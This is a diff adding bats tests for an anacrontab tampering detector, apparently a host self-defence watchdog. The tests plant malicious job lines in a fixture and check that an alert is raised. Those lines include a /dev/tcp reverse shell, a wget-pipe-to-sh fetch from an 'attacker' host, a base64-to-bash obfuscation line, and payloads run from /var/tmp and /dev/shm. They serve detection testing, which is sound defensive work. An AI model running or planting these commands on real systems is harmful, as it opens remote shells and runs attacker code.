@@ -153,3 +153,70 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     [ "${status}" -ne 0 ]
     cap | grep -q '"severity":"alert"'
 }
+
+@test "baseline is chmod 0600 (confidentiality — anacrontab inventory enumerates delayed root-exec surface)" {
+    printf '%s' "${BENIGN}" > "${ANAC}"
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in job → alert" {
+    printf '%s' "${BENIGN}" > "${ANAC}"
+    run_wd
+    printf '%s1\t5\tshell.job\tbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' "${BENIGN}" > "${ANAC}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in job → alert" {
+    printf '%s' "${BENIGN}" > "${ANAC}"
+    run_wd
+    printf '%s1\t5\twget.job\twget -qO- http://attacker/p | sh\n' "${BENIGN}" > "${ANAC}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (base64-decode-pipe): obfuscation variant in job → alert" {
+    printf '%s' "${BENIGN}" > "${ANAC}"
+    run_wd
+    printf '%s1\t5\tobfusc.job\techo YmFzaCAtaQ== | base64 -d | bash\n' "${BENIGN}" > "${ANAC}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (world-writable anacrontab file): file itself world-writable → alert" {
+    printf '%s' "${BENIGN}" > "${ANAC}"
+    run_wd
+    chmod 0666 "${ANAC}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (job under /var/tmp writable root): expands writable-root coverage" {
+    printf '%s' "${BENIGN}" > "${ANAC}"
+    run_wd
+    printf '%s1\t5\tevil.job\t/var/tmp/.payload\n' "${BENIGN}" > "${ANAC}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (job under /dev/shm writable root): tmpfs payload → alert" {
+    printf '%s' "${BENIGN}" > "${ANAC}"
+    run_wd
+    printf '%s1\t5\tevil.job\t/dev/shm/.payload\n' "${BENIGN}" > "${ANAC}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    printf '%s' "${BENIGN}" > "${ANAC}"
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-anacrontab -- ')
+    [ "${main_count}" = "1" ]
+}
